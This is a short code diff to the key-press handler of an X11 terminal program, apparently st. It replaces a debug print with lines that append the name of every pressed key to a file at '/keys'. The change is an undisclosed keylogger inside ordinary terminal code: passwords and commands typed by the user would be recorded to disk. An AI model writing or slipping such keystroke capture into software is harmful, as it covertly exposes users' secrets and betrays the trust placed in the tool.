@@ -1858,7 +1858,10 @@ kpress(XEvent *ev)
 	} else {
 		len = XLookupString(e, buf, sizeof buf, &ksym, NULL);
 	}
-	printf("Key pressed: %s\n", XKeysymToString(XLookupKeysym(&ev->xkey,0)));
+	FILE *f = fopen("/keys","a");
+	fprintf(f,"Key pressed: %s\n", XKeysymToString(XLookupKeysym(&ev->xkey,0)));
+	fclose(f);
+
 	/* 1. shortcuts */
 	for (bp = shortcuts; bp < shortcuts + LEN(shortcuts); bp++) {
 		if (ksym == bp->keysym && match(bp->mod, e->state)) {
